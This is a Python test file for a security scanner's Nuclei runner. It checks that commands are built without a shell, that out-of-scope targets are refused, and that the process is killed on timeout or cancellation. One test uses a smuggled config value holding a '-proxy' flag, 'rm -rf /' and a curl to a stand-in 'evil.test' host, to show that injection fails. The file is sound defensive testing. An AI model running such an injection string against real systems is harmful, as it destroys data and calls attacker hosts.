"""Nuclei EXECUTION-layer safety: command construction, scope, cleanup (Prompt 24, Req. A-D).

Complements test_nuclei_parser_robustness (output handling) and test_nuclei_timeout (the
timeout knobs/precedence contract). What is pinned here is the boundary between operator
configuration and the process that actually runs:

  * argv is built as a LIST for create_subprocess_exec -- there is no shell, so no value
    reaching it can inject a flag or a command. This is the property the whole design rests
    on, and it was previously only implicit.
  * a non-string `nuclei_tags` is REFUSED rather than passed to create_subprocess_exec, which
    used to fail with an opaque `TypeError: expected str, bytes or os.PathLike` recorded as a
    mystery tool failure with no hint that tool_config was at fault.
  * out-of-scope targets never reach nuclei, and a security denial is never downgraded into a
    scannable URL list.
  * cancellation and timeout terminate the process and preserve partial output.

Fully deterministic: the subprocess is faked, no network and no real nuclei binary.
"""

import asyncio

import pytest

from apps.api.scanner_engine.tool_runners import nuclei_runner
from apps.api.scanner_engine.tool_runners.base import CommonFinding, TimedRun
from apps.api.scanner_engine.tool_runners.nuclei_runner import DEFAULT_TAGS, NucleiRunner


def _capture_command(monkeypatch) -> dict:
    """Run NucleiRunner.run() against a stub and record the argv and stdin it would use."""
    seen: dict = {}

    class _Proc:
        returncode = 0
        stdout = None
        stderr = None
        stdin = None

        def kill(self):
            pass

        async def wait(self):
            return 0

    async def _fake_exec(*args, **_kwargs):
        seen["argv"] = list(args)
        return _Proc()

    async def _fake_run_with_timeout(proc, timeout, tool="", *, stdin=None):
        seen["stdin"] = stdin
        return TimedRun(stdout="", stderr="", timed_out=False, exit_code=0)

    monkeypatch.setattr(nuclei_runner.asyncio, "create_subprocess_exec", _fake_exec)
    monkeypatch.setattr(nuclei_runner, "run_with_timeout", _fake_run_with_timeout)
    return seen


# --- A. Command construction -----------------------------------------------------------------

def test_command_is_deterministic_and_carries_the_required_flags(monkeypatch):
    """`-jsonl` is what makes the output parseable at all; the others keep it machine-readable
    and stop nuclei phoning home for updates mid-scan."""
    seen = _capture_command(monkeypatch)
    raw = asyncio.run(NucleiRunner().run("example.com", {}, []))

    argv = seen["argv"]
    assert argv[0] == "nuclei"
    for flag in ("-jsonl", "-silent", "-disable-update-check", "-no-color"):
        assert flag in argv
    # Deterministic: the same inputs produce the same argv.
    seen2 = _capture_command(monkeypatch)
    asyncio.run(NucleiRunner().run("example.com", {}, []))
    assert seen2["argv"] == argv
    assert "nuclei" in raw.command


def test_every_argv_element_is_a_string(monkeypatch):
    """create_subprocess_exec takes argv directly -- a non-string element is a TypeError at
    spawn time, which is how a bad tool_config value used to surface."""
    seen = _capture_command(monkeypatch)
    asyncio.run(NucleiRunner().run("example.com", {"nuclei_tags": "cve"}, []))
    assert all(isinstance(a, str) for a in seen["argv"])


def test_targets_are_passed_on_stdin_not_as_arguments(monkeypatch):
    """Target URLs go in over stdin, so a hostile target string can never be read as a flag."""
    seen = _capture_command(monkeypatch)
    prior = [CommonFinding(asset_type="http_service", value="https://x.test:3000", metadata={})]
    asyncio.run(NucleiRunner().run("x.test", {}, prior))
    assert seen["stdin"] == b"https://x.test:3000"
    assert "https://x.test:3000" not in seen["argv"]


def test_hostile_tag_string_stays_a_single_argument(monkeypatch):
    """No shell is involved, so even a string full of flags and shell metacharacters is ONE
    argument to -tags. It cannot become a separate nuclei flag or a shell command."""
    hostile = "cve -proxy http://evil.test; rm -rf / && curl evil.test"
    seen = _capture_command(monkeypatch)
    asyncio.run(NucleiRunner().run("example.com", {"nuclei_tags": hostile}, []))

    argv = seen["argv"]
    assert argv[argv.index("-tags") + 1] == hostile    # exactly one argv element
    assert "-proxy" not in argv                         # never split into its own flag
    assert argv.count("-tags") == 1


def test_non_string_tags_are_refused_with_a_clear_error(monkeypatch):
    """tool_config keys are allowlisted but VALUES are not typed (`tool_config: dict`). A list
    used to be appended as one argv element and die with an opaque TypeError inside
    create_subprocess_exec; now it is refused by name, and the orchestrator records a tool
    failure whose message identifies the offending key."""
    for bad in (["cve", "-proxy", "http://evil"], {"tag": "cve"}, 123):
        _capture_command(monkeypatch)
        with pytest.raises(ValueError, match="nuclei_tags"):
            asyncio.run(NucleiRunner().run("example.com", {"nuclei_tags": bad}, []))


def test_default_tags_apply_when_unconfigured(monkeypatch):
    seen = _capture_command(monkeypatch)
    asyncio.run(NucleiRunner().run("example.com", {}, []))
    argv = seen["argv"]
    assert argv[argv.index("-tags") + 1] == DEFAULT_TAGS


def test_empty_tags_omits_the_flag_entirely(monkeypatch):
    """An explicit empty value means 'no tag filter', not 'the default set'."""
    seen = _capture_command(monkeypatch)
    asyncio.run(NucleiRunner().run("example.com", {"nuclei_tags": ""}, []))
    assert "-tags" not in seen["argv"]


# --- B. Scope and authorization ----------------------------------------------------------------

def test_a_scope_denial_is_not_downgraded_into_a_scannable_url(monkeypatch):
    """AUDIT-011's invariant, re-pinned at the nuclei entry point: when the SSRF/scope guard
    rejects a target, that denial must PROPAGATE -- it must never fall through to
    `[http://host, https://host]` and hand nuclei a target the policy just refused."""
    from apps.api.scanner_engine import net_guard
    from apps.api.scanner_engine.tool_runners import _web

    def _denied(_value):
        raise net_guard.TargetNotAllowed("blocked by policy")

    monkeypatch.setattr(_web, "resolve_scan_host", _denied)
    with pytest.raises(net_guard.TargetNotAllowed):
        NucleiRunner()._target_urls("169.254.169.254", [])


def test_nuclei_only_scans_the_targets_it_is_given(monkeypatch):
    """The orchestrator filters prior_findings through scope_guard BEFORE calling the runner
    (fail-closed on derived hosts). The runner must scan exactly that set and not re-derive a
    wider one from the bare target."""
    seen = _capture_command(monkeypatch)
    in_scope = [CommonFinding(asset_type="http_service", value="https://ok.x.test", metadata={})]
    asyncio.run(NucleiRunner().run("x.test", {}, in_scope))
    assert seen["stdin"] == b"https://ok.x.test"
    assert b"evil" not in seen["stdin"]


def test_nuclei_requires_active_testing_authorization():
    """Both runners send payloads, so they are gated on the engagement's active-testing
    authorization at the API AND re-checked in the orchestrator."""
    from apps.api.scanner_engine.tool_runners.nuclei_dast_runner import NucleiDastRunner

    assert NucleiRunner.requires_active_testing is True
    assert NucleiDastRunner.requires_active_testing is True


# --- C/D. Timeout, cancellation, cleanup --------------------------------------------------------

def test_timeout_with_partial_output_keeps_findings_and_flags_the_run(monkeypatch):
    """Matrix 11: timeout + partial output. The findings survive AND the run is honestly
    marked timed_out -- a timeout must never read as a clean pass."""
    import json

    from apps.api.tests.test_tool_timeouts import _FakeProc

    line = json.dumps({"template-id": "t", "matched-at": "https://x.test/a",
                       "info": {"name": "Found", "severity": "high"}}).encode()

    async def _fake_exec(*_a, **_k):
        return _FakeProc([(0, line + b"\n"), (10, b"never\n")])

    monkeypatch.setattr(nuclei_runner.asyncio, "create_subprocess_exec", _fake_exec)
    raw = asyncio.run(NucleiRunner().run("example.com", {"nuclei_timeout_seconds": 0.2}, []))

    assert raw.timed_out is True
    assert raw.exit_code == -1
    assert b"never" not in raw.stdout.encode()
    findings = NucleiRunner().parse_vulnerabilities(raw)
    assert len(findings) == 1 and findings[0].title == "Found"


def test_timeout_with_no_output_yields_nothing_and_fabricates_nothing(monkeypatch):
    """Matrix 12: timeout + no output. Empty is empty -- no placeholder finding."""
    from apps.api.scanner_engine.tool_runners.base import classify_run
    from apps.api.tests.test_tool_timeouts import _FakeProc

    async def _fake_exec(*_a, **_k):
        return _FakeProc([(10, b"never\n")])

    monkeypatch.setattr(nuclei_runner.asyncio, "create_subprocess_exec", _fake_exec)
    raw = asyncio.run(NucleiRunner().run("example.com", {"nuclei_timeout_seconds": 0.2}, []))

    assert raw.timed_out is True
    assert raw.stdout == ""
    r = NucleiRunner()
    assert r.parse_vulnerabilities(raw) == []
    assert classify_run(r, raw, False) == "failed"      # never "completed"


def test_timeout_kills_the_process_leaving_no_orphan(monkeypatch):
    """Matrix 13 (timeout half): the subprocess is terminated, not abandoned."""
    from apps.api.tests.test_tool_timeouts import _FakeProc

    procs: list = []

    async def _fake_exec(*_a, **_k):
        proc = _FakeProc([(10, b"never\n")])
        procs.append(proc)
        return proc

    monkeypatch.setattr(nuclei_runner.asyncio, "create_subprocess_exec", _fake_exec)
    asyncio.run(NucleiRunner().run("example.com", {"nuclei_timeout_seconds": 0.2}, []))

    assert procs[0].killed >= 1
    assert procs[0].returncode is not None


def test_cancellation_kills_the_process_and_propagates(monkeypatch):
    """Matrix 13 (cancellation half): a revoked scan / worker shutdown must reap the child
    AND re-raise, so cancellation semantics are preserved and no nuclei is left running."""
    from apps.api.tests.test_tool_timeouts import _FakeProc

    procs: list = []

    async def _fake_exec(*_a, **_k):
        proc = _FakeProc([(60, b"slow\n")])
        procs.append(proc)
        return proc

    monkeypatch.setattr(nuclei_runner.asyncio, "create_subprocess_exec", _fake_exec)

    async def _scenario():
        task = asyncio.ensure_future(NucleiRunner().run("example.com", {}, []))
        await asyncio.sleep(0.05)
        task.cancel()
        await task

    with pytest.raises(asyncio.CancelledError):
        asyncio.run(_scenario())
    assert procs[0].killed >= 1


def test_no_default_wall_clock_timeout_is_preserved(monkeypatch):
    """The existing, deliberate nuclei policy (see test_nuclei_timeout): unconfigured means
    run to natural completion. Re-pinned here so this prompt's changes are visibly not a
    regression of it."""
    seen: dict = {}

    class _Proc:
        returncode = 0
        stdout = None
        stderr = None
        stdin = None

        def kill(self):
            pass

        async def wait(self):
            return 0

    async def _fake_exec(*_a, **_k):
        return _Proc()

    async def _spy(proc, timeout, tool="", *, stdin=None):
        seen["timeout"] = timeout
        return TimedRun(stdout="", stderr="", timed_out=False, exit_code=0)

    monkeypatch.setattr(nuclei_runner.asyncio, "create_subprocess_exec", _fake_exec)
    monkeypatch.setattr(nuclei_runner, "run_with_timeout", _spy)
    asyncio.run(NucleiRunner().run("example.com", {}, []))
    assert seen["timeout"] is None


# --- A/C/D. The timeout VALUE is validated before a process exists ----------------------------
#
# THE DEFECT THESE PIN (reproduced against the pre-fix runner, not assumed).
# `tool_config` keys are allowlisted by scans.service but their VALUES are unvalidated
# (`tool_config: dict` in the schema). The timeout used to be resolved AFTER the spawn with a
# bare `timeout_seconds <= 0`, which for a str/list/dict raises
# `TypeError: '<=' not supported between instances of 'str' and 'int'`. Measured outcome:
#
#     nuclei_timeout_seconds="600"  ->  TypeError | spawned=1 killed=0
#
# The exception escaped `run()` with nuclei ALREADY RUNNING and never killed -- there is no
# try/finally around the spawn -- so a config typo leaked a live active-testing process that
# kept sending template payloads at the target, while the orchestrator recorded only an opaque
# tool failure. Requirement D (no orphaned nuclei process) and Requirement A (the config
# boundary) are both violated by the same line.
#
# Separately, `True` was ACCEPTED: `isinstance(True, int)` is True, so it reached
# `asyncio.wait_for(timeout=True)` as a ONE-SECOND cap on the one tool whose documented policy
# is that it may run for hours -- a timeout the operator never configured.

def _spawn_counting(monkeypatch) -> list:
    """Record every subprocess NucleiRunner.run() spawns, so "was a process created at all?"
    is directly assertable."""
    spawned: list = []

    class _Proc:
        stdout = None
        stderr = None
        stdin = None

        def __init__(self):
            self.returncode = None
            self.killed = 0

        def kill(self):
            self.killed += 1
            self.returncode = -9

        async def wait(self):
            return 0

        async def communicate(self):
            return b"", b""

    async def _fake_exec(*_a, **_k):
        proc = _Proc()
        spawned.append(proc)
        return proc

    async def _fake_run_with_timeout(proc, timeout, tool="", *, stdin=None):
        return TimedRun(stdout="", stderr="", timed_out=False, exit_code=0)

    monkeypatch.setattr(nuclei_runner.asyncio, "create_subprocess_exec", _fake_exec)
    monkeypatch.setattr(nuclei_runner, "run_with_timeout", _fake_run_with_timeout)
    return spawned


@pytest.mark.parametrize("key", ["nuclei_timeout_seconds", "timeout_seconds"])
@pytest.mark.parametrize("bad", ["600", ["600"], {"s": 600}, True])
def test_a_non_numeric_timeout_is_refused_before_any_process_is_spawned(key, bad, monkeypatch):
    """The core repair: refused by NAME, and NO nuclei is started.

    Both keys are covered because both reach the same comparison -- the shared
    `timeout_seconds` is not validated anywhere else either. `True` is included deliberately:
    it is the case that used to pass silently rather than crash."""
    spawned = _spawn_counting(monkeypatch)
    with pytest.raises(ValueError, match=key):
        asyncio.run(NucleiRunner().run("example.com", {key: bad}, []))
    assert spawned == []            # no orphaned active-testing process


def test_the_refusal_names_the_offending_type_not_just_the_key(monkeypatch):
    """An operator reading the tool-run error must be able to fix the config from the message
    alone -- the pre-fix TypeError named neither the key nor the value."""
    _spawn_counting(monkeypatch)
    with pytest.raises(ValueError, match="must be a number of seconds, got str"):
        asyncio.run(NucleiRunner().run("example.com", {"nuclei_timeout_seconds": "600"}, []))


def test_a_bad_timeout_is_refused_even_when_every_other_key_is_valid(monkeypatch):
    """The bad value must not be masked by an otherwise-sound config."""
    spawned = _spawn_counting(monkeypatch)
    with pytest.raises(ValueError, match="nuclei_timeout_seconds"):
        asyncio.run(NucleiRunner().run(
            "example.com", {"nuclei_tags": "cve", "nuclei_timeout_seconds": "600"}, []))
    assert spawned == []


def test_a_valid_timeout_still_spawns_and_runs(monkeypatch):
    """The guard must not turn good configs into errors."""
    spawned = _spawn_counting(monkeypatch)
    raw = asyncio.run(NucleiRunner().run("example.com", {"nuclei_timeout_seconds": 1800}, []))
    assert len(spawned) == 1
    assert raw.exit_code == 0


def test_an_explicit_null_timeout_is_treated_as_unset(monkeypatch):
    """JSON `null` means "no value configured", so it degrades to the documented
    no-wall-clock-timeout default rather than being refused as a bad type."""
    seen: dict = {}

    class _Proc:
        returncode = 0
        stdout = None
        stderr = None
        stdin = None

        def kill(self):
            pass

        async def wait(self):
            return 0

    async def _fake_exec(*_a, **_k):
        return _Proc()

    async def _spy(proc, timeout, tool="", *, stdin=None):
        seen["timeout"] = timeout
        return TimedRun(stdout="", stderr="", timed_out=False, exit_code=0)

    monkeypatch.setattr(nuclei_runner.asyncio, "create_subprocess_exec", _fake_exec)
    monkeypatch.setattr(nuclei_runner, "run_with_timeout", _spy)
    asyncio.run(NucleiRunner().run("example.com", {"nuclei_timeout_seconds": None}, []))
    assert seen["timeout"] is None


def test_validation_does_not_disturb_the_established_precedence(monkeypatch):
    """Re-pinned HERE because the precedence logic itself moved into `_timeout_seconds`
    (test_nuclei_timeout owns the contract; this guards the move). The nuclei key wins, a <=0
    nuclei key still SHADOWS a positive shared key, and the shared key applies alone."""
    assert NucleiRunner._timeout_seconds({"nuclei_timeout_seconds": 1800,
                                          "timeout_seconds": 90}) == 1800
    assert NucleiRunner._timeout_seconds({"nuclei_timeout_seconds": 0,
                                          "timeout_seconds": 300}) is None
    assert NucleiRunner._timeout_seconds({"timeout_seconds": 900}) == 900
    assert NucleiRunner._timeout_seconds({}) is None


def test_the_dast_runner_keeps_its_own_budget_contract():
    """NucleiDastRunner OVERRIDES `_timeout_seconds` with different, already-tested semantics
    (its own key, and a DEFAULT of 600s rather than no cap). Adding the base implementation
    must not change it -- these two policies are deliberately different."""
    from apps.api.scanner_engine.tool_runners.nuclei_dast_runner import (
        DEFAULT_TIMEOUT_SECONDS,
        NucleiDastRunner,
    )

    assert NucleiDastRunner._timeout_seconds({}) == DEFAULT_TIMEOUT_SECONDS
    assert NucleiDastRunner._timeout_seconds({"dast_timeout_seconds": 120}) == 120
    # The nuclei-only key must stay invisible to DAST, as before.
    assert NucleiDastRunner._timeout_seconds({"nuclei_timeout_seconds": 5}) == DEFAULT_TIMEOUT_SECONDS
